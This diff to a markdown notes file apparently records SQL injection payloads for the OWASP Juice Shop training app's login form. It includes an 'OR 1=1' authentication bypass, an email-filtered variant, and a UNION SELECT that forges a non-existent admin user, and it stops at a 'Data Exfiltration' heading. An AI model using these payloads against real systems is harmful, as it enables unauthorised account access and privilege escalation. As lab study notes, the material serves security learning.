@@ -1,12 +1,18 @@
 # Logging In
 
-Basic SQL Injection for logging in as the first user in the database:
+All following statements to be pasted into the 'username' field in the login form, with any arbitrary password.
+
+**Basic SQL Injection for logging in as the first user in the database**
 
 `' OR 1=1;--`
 
-Log in as a user with an email similar to 'jim':
+**Log in as a user with an email similar to 'jim'**
 
 `' OR 1=1 AND email LIKE('%jim%');--`
+
+**Log in as a user that does not exist in the database**
+
+`' UNION SELECT * FROM (SELECT 200 as 'id', 'chad' as 'username', 'chadd@juice-sh.op' as 'email', 'chadd' as 'password', 'admin' as 'role', '' as 'deluxeToken' , '1.3.3.7' as 'lastLoginIp' , 'assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '1999-08-16 14:14:41.644 +00:00' as 'createdAt', '1999-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--`
 
 # Data Exfiltration
 
